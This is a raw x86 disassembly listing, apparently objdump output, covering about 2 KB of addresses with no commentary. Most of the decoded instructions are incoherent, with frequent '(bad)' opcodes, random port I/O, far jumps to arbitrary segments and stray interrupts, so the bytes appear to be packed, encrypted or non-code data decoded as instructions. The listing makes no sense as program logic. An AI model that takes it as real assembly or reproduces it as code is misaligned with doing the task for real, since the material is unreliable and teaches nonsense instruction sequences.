  41c5ac:	mov    al,ds:0x13e68865
  41c5b1:	pusha  
  41c5b2:	or     eax,0xf3ddb440
  41c5b7:	sub    esp,DWORD PTR ds:0xa8f7a8c8
  41c5bd:	(bad)  
  41c5be:	fnstsw WORD PTR [eax+0x3497d24a]
  41c5c4:	pusha  
  41c5c5:	aaa    
  41c5c6:	cmp    eax,0x5a9c2aa6
  41c5cb:	ret    
  41c5cc:	ds loopne 0x41c5c8
  41c5cf:	push   edx
  41c5d0:	xchg   edi,eax
  41c5d1:	mov    ebp,DWORD PTR [ebp+0x1b]
  41c5d4:	rcl    BYTE PTR [esi+0x3412ba8b],0x67
  41c5db:	out    dx,al
  41c5dc:	jne    0x41c623
  41c5de:	and    DWORD PTR [ecx-0x6211a5c4],edi
  41c5e4:	scas   al,BYTE PTR es:[edi]
  41c5e5:	jmp    0xed65a5e5
  41c5ea:	sar    DWORD PTR [edx+0x2c003cc0],0x11
  41c5f1:	enter  0xa3e,0xd8
  41c5f5:	add    al,0xa9
  41c5f7:	xchg   edx,eax
  41c5f8:	jb     0x41c64b
  41c5fa:	jbe    0x41c657
  41c5fc:	adc    BYTE PTR ds:0x11caa363,dl
  41c602:	push   esi
  41c603:	mov    ebx,0xdae28211
  41c608:	pop    edi
  41c609:	push   eax
  41c60a:	pop    edx
  41c60b:	pop    ecx
  41c60c:	fcomip st,st(2)
  41c60e:	dec    ebp
  41c60f:	inc    ebp
  41c610:	and    esi,DWORD PTR ds:0x95c67562
  41c616:	fstp   TBYTE PTR [ebx+0x42374e95]
  41c61c:	sbb    eax,0x807cb881
  41c621:	adc    al,0x37
  41c623:	hlt    
  41c624:	lea    eax,[ecx]
  41c626:	pop    esp
  41c627:	or     bh,BYTE PTR [esi-0x7b85a278]
  41c62d:	jmp    0x80e1:0x9f13fb1a
  41c634:	inc    eax
  41c635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c636:	mov    al,ds:0x74179e59
  41c63b:	retf   0xe42e
  41c63e:	push   esi
  41c63f:	and    BYTE PTR [edi+0x29],al
  41c642:	mov    ebp,0x70819408
  41c647:	cmp    ch,BYTE PTR [ebp-0x2082c139]
  41c64d:	mov    dh,0xac
  41c64f:	jge    0x41c5d2
  41c651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c652:	cmp    eax,0x51dcb70b
  41c657:	test   al,0xff
  41c659:	ret    0x2dbc
  41c65c:	pop    ds
  41c65d:	sahf   
  41c65e:	iret   
  41c65f:	pop    eax
  41c660:	dec    ecx
  41c661:	inc    ecx
  41c662:	test   DWORD PTR [eax-0x17],eax
  41c665:	popa   
  41c666:	push   edx
  41c667:	mov    bh,0x18
  41c669:	adc    al,dl
  41c66b:	fidivr DWORD PTR [ecx-0x18]
  41c66e:	imul   BYTE PTR [ebx]
  41c670:	pop    ss
  41c671:	in     eax,dx
  41c672:	in     al,dx
  41c673:	pushf  
  41c674:	std    
  41c675:	cmc    
  41c676:	test   edx,esp
  41c678:	pop    edx
  41c679:	jo     0x41c647
  41c67b:	int3   
  41c67c:	jns    0x41c686
  41c67e:	dec    esp
  41c67f:	jmp    0x1f33f556
  41c684:	sahf   
  41c685:	lea    esi,[ebx+0x50917019]
  41c68b:	cmp    dh,BYTE PTR [ebx-0x30]
  41c68e:	mov    ch,bh
  41c690:	lods   eax,DWORD PTR ds:[esi]
  41c691:	pop    edx
  41c692:	xor    al,0x83
  41c694:	fnstcw WORD PTR cs:[ebp-0x6]
  41c698:	sbb    DWORD PTR [eax+0x58f3bcb5],0x9d866146
  41c6a2:	pop    edi
  41c6a3:	scas   al,BYTE PTR es:[edi]
  41c6a4:	dec    bh
  41c6a6:	leave  
  41c6a7:	xor    BYTE PTR [ecx-0x306c9a1a],al
  41c6ad:	xchg   esi,eax
  41c6ae:	or     eax,0x4fad341a
  41c6b3:	inc    edi
  41c6b4:	pop    edx
  41c6b5:	pusha  
  41c6b6:	lea    ecx,[ebx+0x2bf70639]
  41c6bc:	fiadd  WORD PTR [esi+0x59aab443]
  41c6c2:	es loop 0x41c68f
  41c6c5:	(bad)  
  41c6c6:	fcomp  st(0)
  41c6c8:	xchg   edi,eax
  41c6c9:	adc    bh,BYTE PTR [ebp-0x645f7c6b]
  41c6cf:	sbb    al,0xe0
  41c6d1:	mov    al,ds:0x29a731f8
  41c6d6:	inc    ebp
  41c6d7:	xor    ecx,esi
  41c6d9:	xor    BYTE PTR [eax-0x12677dd2],dh
  41c6df:	lods   eax,DWORD PTR ds:[esi]
  41c6e0:	sub    DWORD PTR [ebp+ebp*4+0x5ff8538a],edi
  41c6e7:	pop    es
  41c6e8:	jb     0x41c6f5
  41c6ea:	stos   DWORD PTR es:[edi],eax
  41c6eb:	test   DWORD PTR [ebp-0x6b],edx
  41c6ee:	out    0xab,al
  41c6f0:	cli    
  41c6f1:	cmp    al,dl
  41c6f3:	pop    esp
  41c6f4:	mov    WORD PTR ds:0xecf43a53,es
  41c6fa:	shr    DWORD PTR [ebp-0x2bc035dd],1
  41c700:	mov    cl,0x1c
  41c702:	add    bl,BYTE PTR [esi-0x1be2a288]
  41c708:	loop   0x41c73b
  41c70a:	dec    esi
  41c70b:	sbb    ah,al
  41c70d:	dec    ebx
  41c70e:	push   cs
  41c70f:	lds    esp,FWORD PTR ss:[ebx+0x37]
  41c713:	mov    DWORD PTR [ebp-0x77],ecx
  41c716:	pop    edx
  41c717:	cmp    cl,dh
  41c719:	sub    al,0x6e
  41c71b:	mov    dl,0x2f
  41c71d:	test   al,0xc0
  41c71f:	out    0x9c,al
  41c721:	test   BYTE PTR ds:0x2eee06de,al
  41c727:	mov    bl,0x3b
  41c729:	adc    al,0x8d
  41c72b:	cmp    eax,0xc50e751a
  41c730:	pop    esi
  41c731:	das    
  41c732:	add    al,0xe5
  41c734:	pop    es
  41c735:	dec    esp
  41c736:	and    DWORD PTR [ebx-0x23],ecx
  41c739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c73a:	jg     0x41c6cf
  41c73c:	lds    esi,FWORD PTR [edi]
  41c73e:	xor    edi,DWORD PTR [esi]
  41c740:	(bad)  
  41c741:	mul    ah
  41c743:	iret   
  41c744:	pop    es
  41c745:	dec    edx
  41c746:	xchg   edx,eax
  41c747:	das    
  41c748:	mov    al,0x5c
  41c74a:	cmp    DWORD PTR cs:[ecx],edx
  41c74d:	in     al,0x85
  41c74f:	xor    al,0x41
  41c751:	adc    DWORD PTR [ebx+0x44],esp
  41c754:	es jge 0x41c708
  41c757:	pop    ebx
  41c758:	push   esp
  41c759:	inc    edx
  41c75a:	and    edx,DWORD PTR [edi+0x7c]
  41c75d:	dec    edi
  41c75e:	scas   al,BYTE PTR es:[edi]
  41c75f:	and    dl,BYTE PTR [ebx]
  41c761:	inc    eax
  41c762:	inc    edi
  41c763:	loope  0x41c770
  41c765:	sahf   
  41c766:	dec    esp
  41c767:	mov    edi,0xbf8bbc04
  41c76c:	xchg   ecx,eax
  41c76d:	mov    cl,0xf6
  41c76f:	imul   esi,DWORD PTR ds:0xf65846bf,0xb91e642
  41c779:	leave  
  41c77a:	cld    
  41c77b:	cmp    al,0x67
  41c77d:	in     eax,0x9a
  41c77f:	mov    ebp,0xcff929e
  41c784:	rol    DWORD PTR [ebp+0x16ac3ed1],0x6d
  41c78b:	(bad)  
  41c78d:	and    al,0xd2
  41c78f:	outs   dx,BYTE PTR ds:[esi]
  41c790:	in     eax,0x12
  41c792:	mov    ebp,0x34d97ad2
  41c797:	xchg   edx,eax
  41c798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c799:	xchg   BYTE PTR [edx-0x1b],ah
  41c79c:	adc    esp,edx
  41c79e:	rcl    BYTE PTR [ebp-0x7c],0x63
  41c7a2:	in     al,dx
  41c7a3:	dec    ebx
  41c7a4:	cmp    dl,BYTE PTR [edi-0xc]
  41c7a7:	jg     0x41c801
  41c7a9:	lock sti 
  41c7ab:	test   BYTE PTR [ecx],bl
  41c7ad:	or     BYTE PTR ds:0x2e80d12,ch
  41c7b3:	mov    DWORD PTR [esi],eax
  41c7b5:	mov    bh,0x3c
  41c7b7:	enter  0x154f,0xb1
  41c7bb:	in     al,dx
  41c7bc:	mov    ds:0x641abb21,al
  41c7c1:	dec    esi
  41c7c2:	cmc    
  41c7c3:	xchg   ecx,eax
  41c7c4:	xor    eax,0x49d56714
  41c7c9:	jns    0x41c7be
  41c7cb:	push   0xd622026b
  41c7d0:	xchg   ebx,eax
  41c7d1:	ja     0x41c842
  41c7d3:	sub    DWORD PTR [esi],ecx
  41c7d5:	addr16 mov ebp,0xaa5ed74
  41c7db:	pushf  
  41c7dc:	inc    ecx
  41c7dd:	and    esp,0x508084f2
  41c7e3:	ss daa 
  41c7e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7e6:	(bad)  
  41c7e7:	popf   
  41c7e8:	fwait
  41c7e9:	pop    ss
  41c7ea:	pusha  
  41c7eb:	adc    DWORD PTR [edx+0x74],esi
  41c7ee:	dec    edx
  41c7ef:	sub    eax,DWORD PTR [ebx+0x61818172]
  41c7f5:	jo     0x41c7e0
  41c7f7:	arpl   WORD PTR [ebx-0x6d],dx
  41c7fa:	sti    
  41c7fb:	cmp    DWORD PTR [esi],esi
  41c7fd:	test   DWORD PTR [ebx+0x15],ecx
  41c800:	loop   0x41c846
  41c802:	xor    DWORD PTR ds:0xcd70ea6b,esi
  41c808:	or     ch,bl
  41c80a:	jmp    0x8dcf:0xd55e39
  41c811:	daa    
  41c812:	pushf  
  41c813:	lock jmp 0x41c817
  41c816:	jae    0x41c871
  41c818:	scas   eax,DWORD PTR es:[edi]
  41c819:	jns    0x41c874
  41c81b:	cli    
  41c81c:	mov    dh,0x3e
  41c81e:	jp     0x41c7df
  41c820:	ss out dx,al
  41c822:	arpl   WORD PTR [ebx-0x61],ax
  41c825:	push   ecx
  41c826:	sbb    BYTE PTR [edx+0xa0f45b2],dl
  41c82c:	push   ss
  41c82d:	scas   eax,DWORD PTR es:[edi]
  41c82e:	data16 cmp BYTE PTR [ecx+0x40],0xe3
  41c833:	fsub   DWORD PTR [esi]
  41c835:	leave  
  41c836:	loop   0x41c885
  41c838:	mov    esp,0xd0267076
  41c83d:	in     al,dx
  41c83e:	sar    BYTE PTR [eax+0x36],0x81
  41c842:	sti    
  41c843:	pop    ecx
  41c844:	or     al,0xab
  41c846:	adc    bl,ch
  41c848:	push   edx
  41c849:	push   edi
  41c84a:	popf   
  41c84b:	aad    0xa2
  41c84d:	hlt    
  41c84e:	mov    edx,0x4352f26a
  41c853:	sbb    eax,0x6bed1839
	...
  41c860:	add    ah,al
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     DWORD PTR [eax+0x6c],ecx
  41c86f:	ret    
  41c870:	mov    al,0xea
  41c872:	inc    esp
  41c873:	add    DWORD PTR [eax],eax
  41c875:	scas   eax,DWORD PTR es:[edi]
  41c876:	add    eax,DWORD PTR [eax]
  41c878:	add    bl,bh
  41c87a:	outs   dx,DWORD PTR ds:[esi]
  41c87b:	out    0xd7,eax
  41c87d:	inc    esp
  41c87e:	mov    ecx,0xf14e9b27
  41c883:	xor    bl,BYTE PTR [ecx]
  41c885:	mov    WORD PTR [ebp+0x46],gs
  41c888:	mov    BYTE PTR [ecx+0x62],bh
  41c88b:	fsubr  st,st(3)
  41c88d:	push   0x3b7f91a0
  41c892:	push   eax
  41c893:	stc    
  41c894:	ret    
  41c895:	jne    0x41c85a
  41c897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c898:	fwait
  41c899:	mov    ah,0xfc
  41c89b:	mov    ecx,0xd0488782
  41c8a0:	clc    
  41c8a1:	mov    al,ds:0x2838c784
  41c8a6:	mov    cl,0xb7
  41c8a8:	mov    esi,0x9ce97187
  41c8ad:	imul   edi,DWORD PTR [ebp+eiz*4+0x37934749],0x33
  41c8b5:	sbb    DWORD PTR ds:0xc3da3a5b,esp
  41c8bb:	inc    esi
  41c8bc:	out    dx,al
  41c8bd:	stos   BYTE PTR es:[edi],al
  41c8be:	sub    esi,DWORD PTR [si-0x91e]
  41c8c3:	into   
  41c8c4:	pop    ebx
  41c8c5:	push   esp
  41c8c6:	jne    0x41c890
  41c8c8:	and    DWORD PTR [esi+ebx*8+0x45],0x14
  41c8cd:	fist   WORD PTR [edi-0x3d]
  41c8d0:	ja     0x41c91a
  41c8d2:	cmp    eax,0x46047ba5
  41c8d7:	mov    WORD PTR [ecx],ds
  41c8d9:	jb     0x41c862
  41c8db:	ret    0x54cc
  41c8de:	fild   QWORD PTR [edi+0x6bc6be24]
  41c8e4:	xor    al,0x6c
  41c8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8e7:	dec    esi
  41c8e8:	fidivr WORD PTR [ebp+0x28]
  41c8eb:	adc    eax,0xcd8a97a
  41c8f0:	fnstcw WORD PTR [eax]
  41c8f2:	(bad)  
  41c8f3:	sahf   
  41c8f4:	push   edx
  41c8f5:	mov    bl,ah
  41c8f7:	pop    eax
  41c8f8:	ins    DWORD PTR es:[edi],dx
  41c8f9:	mov    eax,ds:0x4fd5d34c
  41c8fe:	adc    DWORD PTR [edi-0x6f700df5],edi
  41c904:	dec    edi
  41c905:	xchg   ebp,eax
  41c906:	retf   0xbbd3
  41c909:	pop    ecx
  41c90a:	sbb    DWORD PTR [ebx+0x195a2d42],ebp
  41c910:	aas    
  41c911:	inc    eax
  41c912:	sub    DWORD PTR [ebx-0x2c],esi
  41c915:	and    bl,BYTE PTR [ebp-0x792714cf]
  41c91b:	lock das 
  41c91d:	mov    BYTE PTR [edx+0x78a25474],bl
  41c923:	mov    edi,0xce2a8a7
  41c928:	outs   dx,BYTE PTR ds:[esi]
  41c929:	outs   dx,DWORD PTR ds:[esi]
  41c92a:	sbb    DWORD PTR [ecx],ebp
  41c92c:	push   ecx
  41c92d:	fsubr  DWORD PTR [ecx]
  41c92f:	xchg   ebx,eax
  41c930:	xor    ecx,DWORD PTR [edi-0x58]
  41c933:	inc    ebx
  41c934:	mov    al,ds:0xf4f80802
  41c939:	addr16 push esi
  41c93c:	mov    dh,0xe6
  41c93e:	stos   BYTE PTR es:[edi],al
  41c93f:	inc    ebx
  41c940:	jnp    0x41c8e7
  41c942:	add    ebp,DWORD PTR [edx+0x4534e3da]
  41c948:	adc    BYTE PTR [edi+0x6db9b1e7],al
  41c94e:	or     al,0xe2
  41c950:	adc    ah,bl
  41c952:	sbb    DWORD PTR [eax],ebp
  41c954:	js     0x41c95d
  41c956:	add    bl,ah
  41c958:	adc    BYTE PTR [ecx],0x15
  41c95b:	nop
  41c95c:	push   0x7d
  41c95e:	push   0x56
  41c960:	add    ch,BYTE PTR [ecx+eiz*2-0x4864475]
  41c967:	mov    dl,0xc8
  41c969:	add    BYTE PTR [edi],cl
  41c96b:	lds    esp,FWORD PTR [edx+0x48]
  41c96e:	popa   
  41c96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c970:	xor    BYTE PTR [edi+ebp*8+0x63],ah
  41c974:	adc    esp,esi
  41c976:	inc    esi
  41c977:	adc    eax,0xc8a65de7
  41c97c:	push   0x91c805eb
  41c981:	(bad)  
  41c982:	aam    0xdf
  41c984:	das    
  41c985:	sar    ah,0x97
  41c988:	jp     0x41c950
  41c98a:	or     dh,BYTE PTR [eax+0x79]
  41c98d:	or     eax,0xe4f29946
  41c992:	and    al,0xef
  41c994:	and    cl,bh
  41c996:	call   0xe4d20850
  41c99b:	fwait
  41c99c:	mov    edx,0xfaff318d
  41c9a1:	pop    edx
  41c9a2:	pusha  
  41c9a3:	in     al,dx
  41c9a4:	mov    eax,0xbe7c109a
  41c9a9:	xchg   ebx,eax
  41c9aa:	jl     0x41c9c1
  41c9ac:	jle    0x41c9c6
  41c9ae:	lods   eax,DWORD PTR ds:[esi]
  41c9af:	add    BYTE PTR [edi+0x5c],bl
  41c9b2:	in     al,0xe6
  41c9b4:	dec    edi
  41c9b5:	test   eax,0x42c130ee
  41c9ba:	ret    0x9bb6
  41c9bd:	fs mov ah,0x76
  41c9c0:	push   edx
  41c9c1:	(bad)  
  41c9c2:	dec    edi
  41c9c3:	dec    edx
  41c9c4:	bnd ret 0x4be3
  41c9c8:	mov    bl,0x70
  41c9ca:	jmp    0x49b48273
  41c9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9d0:	pop    ss
  41c9d1:	gs das 
  41c9d3:	dec    ebx
  41c9d4:	outs   dx,BYTE PTR ds:[esi]
  41c9d5:	in     eax,0x22
  41c9d7:	jns    0x41c9f2
  41c9d9:	pop    ds
  41c9da:	fs mov eax,0x97726ed
  41c9e0:	pop    esi
  41c9e1:	jns    0x41ca17
  41c9e3:	out    0x82,al
  41c9e5:	ret    
  41c9e6:	addr16 pop ds
  41c9e8:	adc    bl,BYTE PTR [esi]
  41c9ea:	mov    ah,0x7b
  41c9ec:	or     ebx,DWORD PTR [edx]
  41c9ee:	or     BYTE PTR [ebx+eiz*4-0x31f17754],0x9c
  41c9f6:	aam    0x5a
  41c9f8:	dec    ecx
  41c9f9:	dec    ecx
  41c9fa:	cmp    DWORD PTR [ebx+0x39],ebx
  41c9fd:	mov    ch,0xcd
  41c9ff:	jbe    0x41c9cf
  41ca01:	shr    DWORD PTR [eax-0x68f55b],cl
  41ca07:	mov    edx,edx
  41ca09:	fiadd  WORD PTR [edx-0x1237d9a2]
  41ca0f:	(bad)  
  41ca10:	jmp    0x38bb:0x8773f1b
  41ca17:	mov    dl,0x72
  41ca19:	and    eax,0xf6921cfe
  41ca1e:	jmp    0x543:0x806e16d6
  41ca25:	clc    
  41ca26:	ret    
  41ca27:	test   dl,al
  41ca29:	gs xchg ecx,eax
  41ca2b:	leave  
  41ca2c:	pop    ebp
  41ca2d:	sub    ch,al
  41ca2f:	push   es
  41ca30:	sbb    DWORD PTR [ebx],edi
  41ca32:	adc    DWORD PTR [edi-0x4e],eax
  41ca35:	sbb    bh,bh
  41ca37:	loopne 0x41ca76
  41ca39:	xchg   edi,eax
  41ca3a:	mov    ch,0x21
  41ca3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca3d:	cmp    eax,0xdb8cb519
  41ca42:	dec    esp
  41ca43:	cmc    
  41ca44:	sbb    eax,0x51f3e1f6
  41ca49:	pop    ecx
  41ca4a:	jp     0x41ca94
  41ca4c:	lods   al,BYTE PTR ds:[esi]
  41ca4d:	sbb    al,0xc6
  41ca4f:	sbb    DWORD PTR [eax+ebx*8-0x22],esi
  41ca53:	jne    0x41ca0c
  41ca55:	inc    esi
  41ca56:	lock sub bl,BYTE PTR [ecx]
  41ca59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca5a:	pop    eax
  41ca5c:	or     eax,0xb99af68
  41ca61:	test   al,0x59
  41ca63:	hlt    
  41ca64:	adc    eax,0x69fcc9dd
  41ca69:	xor    eax,0x8d351252
  41ca6e:	jmp    0x135:0xf7e79843
  41ca75:	inc    eax
  41ca76:	jge    0x41ca36
  41ca78:	push   es
  41ca79:	cdq    
  41ca7a:	dec    ecx
  41ca7b:	rol    bh,1
  41ca7d:	cmc    
  41ca7e:	mov    ecx,0xf1cdb2b5
  41ca83:	add    edx,DWORD PTR [edx]
  41ca85:	or     eax,0xddb124ff
  41ca8a:	push   esp
  41ca8b:	mov    ?,WORD PTR [esi-0x5f]
  41ca8e:	xchg   edx,eax
  41ca8f:	out    dx,eax
  41ca90:	cmp    eax,0xa953f266
  41ca95:	add    DWORD PTR [ecx+0x4b],esi
  41ca98:	pop    ecx
  41ca99:	dec    ecx
  41ca9a:	xchg   edi,eax
  41ca9b:	(bad)  
  41ca9d:	aam    0x2f
  41ca9f:	mov    ds:0xbafa124d,al
  41caa4:	pop    es
  41caa5:	ins    DWORD PTR es:[edi],dx
  41caa6:	fidiv  DWORD PTR [ebx]
  41caa8:	out    dx,al
  41caa9:	scas   al,BYTE PTR es:[edi]
  41caaa:	(bad)  
  41caab:	dec    edx
  41caac:	or     DWORD PTR [edi+0x4],edi
  41caaf:	in     al,dx
  41cab0:	add    al,0x7d
  41cab2:	mov    ss,WORD PTR [ebx]
  41cab4:	push   edx
  41cab5:	jbe    0x41cac4
  41cab7:	je     0x41cb2b
  41cab9:	push   ss
  41caba:	in     eax,dx
  41cabb:	jl     0x41ca67
  41cabd:	or     al,0x24
  41cabf:	or     eax,0xfb18379b
  41cac4:	push   cs
  41cac5:	pop    ecx
  41cac6:	push   es
  41cac7:	mov    esi,0x64f9a4c1
  41cacc:	(bad)  
  41cacd:	xor    esi,eax
  41cacf:	iret   
  41cad0:	adc    DWORD PTR [ecx-0x6a1d0476],eax
  41cad6:	dec    edx
  41cad7:	cld    
  41cad8:	clc    
  41cad9:	xchg   esi,eax
  41cada:	ja     0x41ca8f
  41cadc:	sub    al,0x9c
  41cade:	jne    0x41cb25
  41cae0:	mov    ebp,DWORD PTR [ecx]
  41cae2:	test   dh,0x49
  41cae5:	out    0x78,eax
  41cae7:	ss fwait
  41cae9:	repz adc BYTE PTR [edx-0x25],ah
  41caed:	dec    ebx
  41caee:	cmp    al,0xb9
  41caf0:	in     eax,dx
  41caf1:	sti    
  41caf2:	mov    edx,ebx
  41caf4:	add    BYTE PTR [ebx-0x77ad5bd8],ah
  41cafa:	inc    esi
  41cafb:	add    ah,al
  41cafd:	xor    al,0xd0
  41caff:	loop   0x41cac5
  41cb01:	cmc    
  41cb02:	jp     0x41cb07
  41cb04:	loope  0x41cae9
  41cb06:	sbb    ch,BYTE PTR [ebp+0x2abc86e2]
  41cb0c:	lods   eax,DWORD PTR ds:[esi]
  41cb0d:	ror    bl,0x8f
  41cb10:	sub    DWORD PTR [ecx],edi
  41cb12:	shl    DWORD PTR [ebx],cl
  41cb14:	sbb    eax,0x34ec0aa8
  41cb19:	in     eax,0xd1
  41cb1b:	scas   al,BYTE PTR es:[edi]
  41cb1c:	push   eax
  41cb1d:	test   eax,0xb9b284d6
  41cb22:	or     edx,DWORD PTR [esi+0x713a8274]
  41cb28:	ror    edi,1
  41cb2a:	or     ah,BYTE PTR [esi]
  41cb2c:	xchg   ebp,eax
  41cb2d:	and    eax,0xc72f154a
  41cb32:	and    edx,DWORD PTR [esi-0x41]
  41cb35:	js     0x41cb94
  41cb37:	mov    eax,0x9f34328c
  41cb3c:	int3   
  41cb3d:	fwait
  41cb3e:	mov    ch,BYTE PTR [ebx]
  41cb40:	std    
  41cb41:	adc    BYTE PTR [edx+edx*4+0x5f3d2b08],bh
  41cb48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb49:	xor    al,0x9
  41cb4b:	add    ebx,DWORD PTR [esi+0x37ce49bf]
  41cb51:	cdq    
  41cb52:	add    eax,0x577ce8e8
  41cb57:	sub    al,0x6b
  41cb59:	scas   eax,DWORD PTR es:[edi]
  41cb5a:	sub    ebp,DWORD PTR [eax]
  41cb5c:	sahf   
  41cb5d:	(bad)  
  41cb5e:	(bad)  
  41cb5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb61:	(bad)  [ebp+0x50]
  41cb64:	ja     0x41caea
  41cb66:	enter  0x44a8,0x19
  41cb6a:	mov    dh,0xe7
  41cb6c:	jnp    0x41cb66
  41cb6e:	adc    BYTE PTR [edi+0x7d],al
  41cb71:	data16 mov dh,0x5f
  41cb74:	into   
  41cb75:	push   ebp
  41cb76:	cwde   
  41cb77:	cdq    
  41cb78:	jno    0x41cb8c
  41cb7a:	jmp    0x4fdbccc
  41cb7f:	push   cs
  41cb80:	lock shl BYTE PTR ds:0xf216b8,1
  41cb87:	xchg   edx,eax
  41cb88:	lock xchg esp,eax
  41cb8a:	jbe    0x41cb5b
  41cb8c:	jge    0x41cb96
  41cb8e:	call   0xd3f39b31
  41cb93:	mov    ebp,0xdd7fb3b9
  41cb98:	leave  
  41cb99:	sub    ebp,ebp
  41cb9b:	into   
  41cb9c:	imul   esi,DWORD PTR cs:[ebx],0xd886a04a
  41cba3:	jno    0x41cb7b
  41cba5:	adc    eax,0x5f9aa5
  41cbaa:	or     DWORD PTR [ebp-0x4094db4],ebx
  41cbb0:	jb     0x41cb4e
  41cbb2:	(bad)  
  41cbb4:	push   ecx
  41cbb5:	push   esp
  41cbb6:	pop    ebp
  41cbb7:	retf   
  41cbb8:	jno    0x41cc26
  41cbba:	or     bh,BYTE PTR [esi+0x65440756]
  41cbc0:	sahf   
  41cbc1:	(bad)  
  41cbc2:	das    
  41cbc3:	xchg   esi,eax
  41cbc4:	mov    al,ds:0x1f422114
  41cbc9:	and    BYTE PTR [esi+0x16],0xf9
  41cbcd:	adc    eax,DWORD PTR [esi+0x5f]
  41cbd0:	dec    ebx
  41cbd1:	xor    DWORD PTR [ebp-0x195561ef],esi
  41cbd7:	mov    dh,0x12
  41cbd9:	pop    ecx
  41cbda:	or     eax,0x3b14ef8d
  41cbdf:	jns    0x41cbce
  41cbe1:	fnstcw WORD PTR [ecx-0x7a]
  41cbe4:	mov    dh,BYTE PTR [edi+0x7516374]
  41cbea:	and    BYTE PTR [edi-0xd21203f],dl
  41cbf0:	(bad)  
  41cbf1:	lds    ebp,FWORD PTR [ecx-0x477f392a]
  41cbf7:	and    eax,0x25fe3601
  41cbfc:	cmp    ebx,eax
  41cbfe:	jbe    0x41cbda
  41cc00:	(bad)  
  41cc01:	mov    ax,0x3dad
  41cc05:	pushf  
  41cc06:	mov    bl,0xae
  41cc08:	scas   eax,DWORD PTR es:[edi]
  41cc09:	es imul esp,esp,0x7830db10
  41cc10:	mov    edi,0x38326e6b
  41cc15:	add    ch,BYTE PTR [edi-0xe]
  41cc18:	out    dx,al
  41cc19:	adc    DWORD PTR [eax-0x1a45aded],0xffffffd3
  41cc20:	mov    al,0x16
  41cc22:	xor    al,0x1d
  41cc24:	addr16 cs inc esp
  41cc27:	into   
	...
  41cc30:	add    BYTE PTR [ecx-0x10111089],bl
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0xf3590dc7,ecx
  41cc41:	cdq    
  41cc42:	dec    eax
  41cc43:	add    DWORD PTR [eax],eax
  41cc45:	scas   eax,DWORD PTR es:[edi]
  41cc46:	add    eax,DWORD PTR [eax]
  41cc48:	add    BYTE PTR [ecx],dl
  41cc4a:	js     0x41cbeb
  41cc4c:	dec    ebx
  41cc4d:	ret    0x76d5
  41cc50:	test   DWORD PTR [esi],edi
  41cc52:	rol    DWORD PTR [ecx-0x23],1
  41cc55:	xchg   dl,dh
  41cc57:	les    eax,FWORD PTR [ecx]
  41cc59:	les    edx,FWORD PTR [ebx+0x57555d23]
  41cc5f:	inc    esp
  41cc60:	mov    esi,0xa52b560
  41cc65:	add    al,BYTE PTR [esi+0x4b]
  41cc68:	cmp    esp,DWORD PTR [ecx-0x11]
  41cc6b:	imul   edi,DWORD PTR [esi+0x65c879f7],0xffffffbd
  41cc72:	xor    al,BYTE PTR ds:0x4feae35c
  41cc78:	xchg   ebp,eax
  41cc79:	sbb    ch,cl
  41cc7b:	mov    ds:0xa64d8fdd,eax
  41cc80:	push   0xffffffaf
  41cc82:	addr16 cmc 
  41cc84:	push   ebx
  41cc85:	int    0x34
  41cc87:	xchg   ebp,eax
  41cc88:	in     eax,dx
  41cc89:	inc    ecx
  41cc8a:	cmp    cl,BYTE PTR [ecx+0x5e]
  41cc8d:	addr16 pop ebp
  41cc8f:	fiadd  WORD PTR [eax-0x2c2e5945]
  41cc95:	mov    esp,0x2fa1d76
  41cc9a:	call   0xb21ddded
  41cc9f:	cmp    bh,BYTE PTR [esi+0x75f38dd]
  41cca5:	adc    edi,eax
  41cca7:	sub    al,0xae
  41cca9:	xchg   ebx,eax
  41ccaa:	pop    ebp
  41ccab:	jmp    0xe0566e6c
  41ccb0:	mov    ah,BYTE PTR [ebp-0x48]
  41ccb3:	pushf  
  41ccb4:	mov    DWORD PTR [ebx+0x71],eax
  41ccb7:	push   esi
  41ccb8:	dec    ebx
  41ccb9:	fcomp  st(4)
  41ccbb:	(bad)  
  41ccbc:	sbb    BYTE PTR [eax],dl
  41ccbe:	add    BYTE PTR [edi-0x1b],0x31
  41ccc2:	adc    BYTE PTR [ebp+0x27],bh
  41ccc5:	and    DWORD PTR [esi],0x875210eb
  41cccb:	je     0x41cd15
  41cccd:	inc    edi
  41ccce:	pop    esi
  41cccf:	test   eax,0x70357d80
  41ccd4:	shr    DWORD PTR ds:[ebx-0x2784575d],1
  41ccdb:	mov    WORD PTR [ebp-0x26439cd6],es
  41cce1:	jbe    0x41cd15
  41cce3:	dec    ebp
  41cce4:	std    
  41cce5:	mov    es,WORD PTR [ebp-0x67]
  41cce8:	ret    
  41cce9:	test   esp,ebx
  41cceb:	mov    esi,0x4789b3cf
  41ccf0:	ret    0x1885
  41ccf3:	xlat   BYTE PTR ds:[ebx]
  41ccf4:	es pop esp
  41ccf6:	sahf   
  41ccf7:	das    
  41ccf8:	push   eax
  41ccf9:	test   DWORD PTR [esi+0x6ef19145],eax
  41ccff:	iret   
  41cd00:	std    
  41cd01:	sub    DWORD PTR [edx-0x2822a106],ebx
  41cd07:	ds jmp 0x7427:0x5764bab0
  41cd0f:	xchg   edi,eax
  41cd10:	xor    al,0xe3
  41cd12:	int    0xb8
  41cd14:	push   cs
  41cd15:	in     eax,0x6
  41cd17:	je     0x41cce6
  41cd19:	mov    bh,0x77
  41cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
